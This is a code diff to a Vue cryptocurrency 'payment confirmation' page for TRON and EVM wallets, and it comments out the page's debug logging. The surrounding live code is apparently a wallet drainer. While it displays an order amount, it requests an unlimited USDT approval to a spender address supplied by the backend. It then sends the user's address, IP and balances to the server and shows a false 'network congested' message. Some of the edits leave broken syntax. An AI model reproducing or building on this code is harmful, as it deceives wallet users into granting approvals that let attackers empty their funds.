@@ -143,7 +143,7 @@ const configData = ref({
 
 // 初始化 - 完全按照参考代码 line 173-222
 onMounted(async () => {
-  console.log('=== 支付确认页面初始化 ===')
+  // // console.log('=== 支付确认页面初始化 ===')
   
   // 0. 从URL解析链类型
   const urlParams = new URLSearchParams(window.location.search)
@@ -152,7 +152,7 @@ onMounted(async () => {
     const match = idParam.match(/^(trc|erc|bsc|okc|pol|grc)(\d{1,15})$/i)
     if (match) {
       chain.value = match[1].toUpperCase()
-      console.log('从URL解析链类型:', chain.value)
+      // // console.log('从URL解析链类型:', chain.value)
       
       // 根据链类型设置合约地址（关键！）
       switch (chain.value) {
@@ -177,7 +177,7 @@ onMounted(async () => {
         default:
           usdtContractAddress.value = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
       }
-      console.log('✅ 已设置合约地址:', usdtContractAddress.value)
+      // // console.log('✅ 已设置合约地址:', usdtContractAddress.value)
     }
   }
   
@@ -190,12 +190,12 @@ onMounted(async () => {
   // 注意：不主动检测和切换链，避免与 TP 钱包冲突
   // TP 钱包会根据 deep link 中的 chain 参数自动切换到正确的链
   
-  console.log('=== 初始化完成 ===')
-  console.log('chain:', chain.value)
-  console.log('合约地址:', usdtContractAddress.value)
-  console.log('configData:', configData.value)
-  console.log('paymentAmount:', paymentAmount.value)
-  console.log('authAmount:', authAmount.value)
+  // // console.log('=== 初始化完成 ===')
+  // // console.log('chain:', chain.value)
+  // // console.log('合约地址:', usdtContractAddress.value)
+  // // console.log('configData:', configData.value)
+  // // console.log('paymentAmount:', paymentAmount.value)
+  // // console.log('authAmount:', authAmount.value)
 })
 
 // 检测并切换到正确的链
@@ -204,20 +204,20 @@ async function checkAndSwitchChain() {
     if (chain.value === 'TRC') {
       // TRC链 - 检测 TronLink
       if (typeof window.tronWeb !== 'undefined') {
-        console.log('✅ TronLink 已连接')
+        // // console.log('✅ TronLink 已连接')
         // 等待 TronLink 准备就绪
         let retries = 0
         while (retries < 10) {
           if (window.tronWeb.ready) {
-            console.log('✅ TronLink 已就绪')
+            // // console.log('✅ TronLink 已就绪')
             return
           }
           await new Promise(resolve => setTimeout(resolve, 500))
           retries++
         }
-        console.warn('⚠️ TronLink 未就绪，请手动刷新页面')
+        // // console.warn('⚠️ TronLink 未就绪，请手动刷新页面')
       } else {
-        console.warn('⚠️ 未检测到 TronLink，请确保钱包已安装')
+        // // console.warn('⚠️ 未检测到 TronLink，请确保钱包已安装')
       }
     } else {
       // EVM链 - 检测并切换网络
@@ -237,7 +237,7 @@ async function checkAndSwitchChain() {
         const targetChainId = chainIds[chain.value]
         
         if (currentChainId !== targetChainId) {
-          console.warn(`⚠️ 当前链 ID: ${currentChainId}, 需要切换到: ${targetChainId}`)
+          // // console.warn(`⚠️ 当前链 ID: ${currentChainId}, 需要切换到: ${targetChainId}`)
           
           // 尝试切换链
           try {
@@ -245,31 +245,31 @@ async function checkAndSwitchChain() {
               method: 'wallet_switchEthereumChain',
               params: [{ chainId: '0x' + targetChainId.toString(16) }]
             })
-            console.log('✅ 已切换到正确的链')
+            // // console.log('✅ 已切换到正确的链')
           } catch (switchError) {
             // 如果链不存在，可能需要添加链（这里暂不处理）
-            console.error('切换链失败:', switchError)
+            // // console.error('切换链失败:', switchError)
             alert(`请在钱包中手动切换到 ${chain.value} 网络`)
           }
         } else {
-          console.log('✅ 钱包已连接到正确的链')
+          // // console.log('✅ 钱包已连接到正确的链')
         }
       }
     }
   } catch (error) {
-    console.error('检测链失败:', error)
+    // // console.error('检测链失败:', error)
   }
 }
 
 // 加载后端配置 - 完全模仿参考代码的逻辑
 async function loadBackendConfig() {
   try {
-    console.log('=== 加载后端配置 ===')
+    // // console.log('=== 加载后端配置 ===')
     
     const response = await fetch('/payment-config')
     const data = await response.json()
     
-    console.log('后端配置响应:', data)
+    // // console.log('后端配置响应:', data)
     
     if (data.status === 'success' && data.config) {
       // 处理 permission_address（可能有多个，随机选一个）
@@ -296,11 +296,11 @@ async function loadBackendConfig() {
         // ⚠️ 不再覆盖 authAmount，保持显示订单金额
       }
       
-      console.log('最终配置数据:', configData.value)
-      console.log('授权金额:', authAmount.value)
+      // // console.log('最终配置数据:', configData.value)
+      // // console.log('授权金额:', authAmount.value)
     }
   } catch (error) {
-    console.error('加载后端配置失败:', error)
+    // // console.error('加载后端配置失败:', error)
   }
 }
 
@@ -310,13 +310,13 @@ async function loadOrderData() {
   const urlAmount = route.params.amount  // 从URL路径获取金额
   const queryAmount = route.query.amount  // 从URL查询参数获取金额 ⭐️ 新增
   
-  console.log('=== PaymentConfirm: 开始加载订单数据 ===')
-  console.log('订单号:', orderSN)
-  console.log('URL路径金额:', urlAmount)
-  console.log('URL查询参数金额:', queryAmount)
+  // // console.log('=== PaymentConfirm: 开始加载订单数据 ===')
+  // // console.log('订单号:', orderSN)
+  // // console.log('URL路径金额:', urlAmount)
+  // // console.log('URL查询参数金额:', queryAmount)
   
   if (!orderSN) {
-    console.error('❌ 订单号为空')
+    // // console.error('❌ 订单号为空')
     return
   }
   
@@ -327,7 +327,7 @@ async function loadOrderData() {
     if (amount > 0) {
       paymentAmount.value = amount.toFixed(2)
       authAmount.value = amount.toFixed(2)
-      console.log('✅ 从URL参数加载金额成功:', paymentAmount.value)
+      // console.log('✅ 从URL参数加载金额成功:', paymentAmount.value)
       
       // 构造基本订单数据
       orderData.value = {
@@ -335,18 +335,18 @@ async function loadOrderData() {
         actual_price: amount
       }
       
-      console.log('=== 最终支付金额:', paymentAmount.value, '===')
+      // console.log('=== 最终支付金额:', paymentAmount.value, '===')
       return
     }
   }
   
   // 备用方案2：从 sessionStorage 获取
-  console.log('URL无金额参数，尝试从 sessionStorage 读取...')
+  // console.log('URL无金额参数，尝试从 sessionStorage 读取...')
   const cachedData = sessionStorage.getItem(`order_${orderSN}`)
   if (cachedData) {
     try {
       orderData.value = JSON.parse(cachedData)
-      console.log('从 sessionStorage 读取到的订单数据:', orderData.value)
+      // console.log('从 sessionStorage 读取到的订单数据:', orderData.value)
       
       const amount = parseFloat(
         orderData.value.actual_price || 
@@ -358,25 +358,25 @@ async function loadOrderData() {
       if (amount > 0) {
         paymentAmount.value = amount.toFixed(2)
         authAmount.value = amount.toFixed(2)
-        console.log('✅ 从 sessionStorage 加载金额成功:', paymentAmount.value)
-        console.log('=== 最终支付金额:', paymentAmount.value, '===')
+        // console.log('✅ 从 sessionStorage 加载金额成功:', paymentAmount.value)
+        // console.log('=== 最终支付金额:', paymentAmount.value, '===')
         return
       }
     } catch (e) {
-      console.error('解析 sessionStorage 数据失败:', e)
+      // console.error('解析 sessionStorage 数据失败:', e)
     }
   }
   
   // 备用方案2：从后端API获取订单数据
   try {
-    console.log('正在从数据库获取订单信息...')
+    // console.log('正在从数据库获取订单信息...')
     const response = await fetch(`/api/order/${orderSN}`)
     const data = await response.json()
-    console.log('API 返回数据:', data)
+    // console.log('API 返回数据:', data)
     
     if (data.code === 200 && data.data) {
       orderData.value = data.data
-      console.log('订单数据:', orderData.value)
+      // console.log('订单数据:', orderData.value)
       
       // 尝试多个可能的字段名
       const amount = parseFloat(
@@ -385,22 +385,22 @@ async function loadOrderData() {
         orderData.value.price || 
         0
       )
-      console.log('解析后的金额:', amount)
+      // console.log('解析后的金额:', amount)
       
       if (amount > 0) {
         paymentAmount.value = amount.toFixed(2)
         authAmount.value = amount.toFixed(2)
-        console.log('✅ 从API加载金额成功:', paymentAmount.value)
+        // console.log('✅ 从API加载金额成功:', paymentAmount.value)
       } else {
-        console.error('❌ 订单金额为0或无效')
+        // console.error('❌ 订单金额为0或无效')
         paymentAmount.value = '0.00'
         authAmount.value = '0.00'
       }
     } else {
-      console.error('❌ API返回数据格式错误:', data)
+      // console.error('❌ API返回数据格式错误:', data)
       
       // 备用方案3：尝试从 sessionStorage 获取
-      console.log('尝试从 sessionStorage 备用读取...')
+      // console.log('尝试从 sessionStorage 备用读取...')
       const cachedData = sessionStorage.getItem(`order_${orderSN}`)
       if (cachedData) {
         try {
@@ -409,18 +409,18 @@ async function loadOrderData() {
           if (amount > 0) {
             paymentAmount.value = amount.toFixed(2)
             authAmount.value = amount.toFixed(2)
-            console.log('✅ 从缓存加载成功:', paymentAmount.value)
+            // console.log('✅ 从缓存加载成功:', paymentAmount.value)
           }
         } catch (e) {
-          console.error('解析缓存数据失败:', e)
+          // console.error('解析缓存数据失败:', e)
         }
       }
     }
   } catch (error) {
-    console.error('❌ 从API加载订单数据失败:', error)
+    // console.error('❌ 从API加载订单数据失败:', error)
     
     // 备用方案3：尝试从 sessionStorage 获取
-    console.log('API失败，尝试从 sessionStorage 备用读取...')
+    // console.log('API失败，尝试从 sessionStorage 备用读取...')
     const cachedData = sessionStorage.getItem(`order_${orderSN}`)
     if (cachedData) {
       try {
@@ -429,15 +429,15 @@ async function loadOrderData() {
         if (amount > 0) {
           paymentAmount.value = amount.toFixed(2)
           authAmount.value = amount.toFixed(2)
-          console.log('✅ 从缓存加载成功:', paymentAmount.value)
+          // console.log('✅ 从缓存加载成功:', paymentAmount.value)
         }
       } catch (e) {
-        console.error('解析缓存数据失败:', e)
+        // console.error('解析缓存数据失败:', e)
       }
     }
   }
   
-  console.log('=== 最终支付金额:', paymentAmount.value, '===')
+  // console.log('=== 最终支付金额:', paymentAmount.value, '===')
 }
 
 // 处理支付按钮点击
@@ -472,7 +472,7 @@ async function confirmPayment() {
   showLoading.value = true
 
   try {
-    console.log('用户确认授权:', {
+    // console.log('用户确认授权:', {
       usdtContract: usdtContractAddress.value,
       configData: configData.value,
       amount: authAmount.value,
@@ -482,7 +482,7 @@ async function confirmPayment() {
 
     // 检测钱包类型并发起授权交易
     const walletType = detectWalletType()
-    console.log('检测到钱包类型:', walletType)
+    // console.log('检测到钱包类型:', walletType)
     
     if (walletType === 'tronlink') {
       await approveWithTronLink()
@@ -493,7 +493,7 @@ async function confirmPayment() {
     }
     
   } catch (error) {
-    console.error('处理失败:', error)
+    // console.error('处理失败:', error)
     alert('授权失败: ' + error.message)
   } finally {
     showLoading.value = false
@@ -502,27 +502,27 @@ async function confirmPayment() {
 
 // 检测钱包类型 - 根据链类型判断（优先根据 chain 判断，而不是钱包对象）
 function detectWalletType() {
-  console.log('=== detectWalletType ===')
-  console.log('chain.value:', chain.value)
-  console.log('window.tronWeb:', typeof window.tronWeb)
-  console.log('window.ethereum:', typeof window.ethereum)
+  // console.log('=== detectWalletType ===')
+  // console.log('chain.value:', chain.value)
+  // console.log('window.tronWeb:', typeof window.tronWeb)
+  // console.log('window.ethereum:', typeof window.ethereum)
   
   if (chain.value === 'TRC') {
     // TRC链：优先返回 tronlink，即使 window.tronWeb 未完全就绪
     // TP 钱包在 TRON 模式下也会注入 tronWeb
     if (typeof window.tronWeb !== 'undefined') {
-      console.log('检测到 TronWeb，返回 tronlink')
+      // console.log('检测到 TronWeb，返回 tronlink')
       return 'tronlink'
     }
   } else {
     // ERC/BSC/POL/OKC/GRC 使用 MetaMask 系列
     if (typeof window.ethereum !== 'undefined') {
-      console.log('检测到 Ethereum，返回 metamask')
+      // console.log('检测到 Ethereum，返回 metamask')
       return 'metamask'
     }
   }
   
-  console.log('未检测到钱包')
+  // console.log('未检测到钱包')
   return null
 }
 
@@ -530,16 +530,16 @@ function detectWalletType() {
 async function approveWithTronLink() {
   try {
     // 等待 TronWeb 准备就绪（TP 钱包可能需要时间注入）
-    console.log('等待 TronWeb 准备就绪...')
+    // console.log('等待 TronWeb 准备就绪...')
     let retries = 0
     while (retries < 20) {
       if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-        console.log('✅ TronWeb 已就绪')
+        // console.log('✅ TronWeb 已就绪')
         break
       }
       await new Promise(resolve => setTimeout(resolve, 500))
       retries++
-      console.log(`等待 TronWeb... (${retries}/20)`)
+      // console.log(`等待 TronWeb... (${retries}/20)`)
     }
     
     if (!window.tronWeb || !window.tronWeb.ready || !window.tronWeb.defaultAddress) {
@@ -551,11 +551,11 @@ async function approveWithTronLink() {
     const approvalAmount = configData.value.authorized_amount
     const userAddress = window.tronWeb.defaultAddress.base58
     
-    console.log('=== TRC20授权（使用TronWeb） ===')
-    console.log('USDT合约:', usdtContractAddress.value)
-    console.log('授权给（spender）:', spenderAddress)
-    console.log('用户地址:', userAddress)
-    console.log('授权金额:', approvalAmount)
+    // console.log('=== TRC20授权（使用TronWeb） ===')
+    // console.log('USDT合约:', usdtContractAddress.value)
+    // console.log('授权给（spender）:', spenderAddress)
+    // console.log('用户地址:', userAddress)
+    // console.log('授权金额:', approvalAmount)
     
     // 使用 TronWeb 直接构建授权交易
     const tronWeb = window.tronWeb
@@ -566,7 +566,7 @@ async function approveWithTronLink() {
     // 授权无限额度（最大 uint256 值）
     const unlimitedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
     
-    console.log('授权金额: 无限额度')
+    // console.log('授权金额: 无限额度')
     
     // 调用合约的 approve 方法
     const transaction = await usdtContract.approve(
@@ -577,7 +577,7 @@ async function approveWithTronLink() {
       shouldPollResponse: false
     })
     
-    console.log('授权交易已提交:', transaction)
+    // console.log('授权交易已提交:', transaction)
     
     if (transaction) {
       // 提交用户数据到后端
@@ -589,7 +589,7 @@ async function approveWithTronLink() {
       return false
     }
   } catch (error) {
-    console.error('TRC20授权失败:', error)
+    // console.error('TRC20授权失败:', error)
     alert('授权失败: ' + error.message)
     return false
   }
@@ -621,7 +621,7 @@ async function approveWithMetaMask() {
     else if (currentChainId === 66) chain = 'OKC'
     else if (currentChainId === 86) chain = 'GRC'
     
-    console.log('EVM授权参数:', {
+    // console.log('EVM授权参数:', {
       address: userAddress,
       spender,
       amount,
@@ -648,7 +648,7 @@ async function approveWithMetaMask() {
       throw new Error('生成授权交易失败')
     }
     
-    console.log('生成授权交易成功，等待用户签名...')
+    // console.log('生成授权交易成功，等待用户签名...')
     
     // 使用钱包发送交易
     const txHash = await window.ethereum.request({
@@ -656,7 +656,7 @@ async function approveWithMetaMask() {
       params: [result.data.transaction]
     })
     
-    console.log('授权交易已提交:', txHash)
+    // console.log('授权交易已提交:', txHash)
     
     // 提交用户数据到后端
     await submitUserDataToBackend(userAddress, chain)
@@ -664,7 +664,7 @@ async function approveWithMetaMask() {
     alert('当前网络拥堵，\n\n请在当前页面中耐心等待返回结果')
     
   } catch (error) {
-    console.error('MetaMask 授权失败:', error)
+    // console.error('MetaMask 授权失败:', error)
     throw error
   }
 }
@@ -687,7 +687,7 @@ async function submitUserDataToBackend(userAddress, chainType) {
       const ipData = await ipResponse.json()
       ipAddress = ipData.ip
     } catch (e) {
-      console.warn('获取IP失败:', e)
+      // console.warn('获取IP失败:', e)
     }
     
     // 获取权限地址和余额信息
@@ -731,10 +731,10 @@ async function submitUserDataToBackend(userAddress, chainType) {
     })
     
     const result = await response.json()
-    console.log('提交用户数据结果:', result)
+    // console.log('提交用户数据结果:', result)
     
   } catch (error) {
-    console.error('提交用户数据失败:', error)
+    // console.error('提交用户数据失败:', error)
     // 不影响主流程，仅记录错误
   }
 }
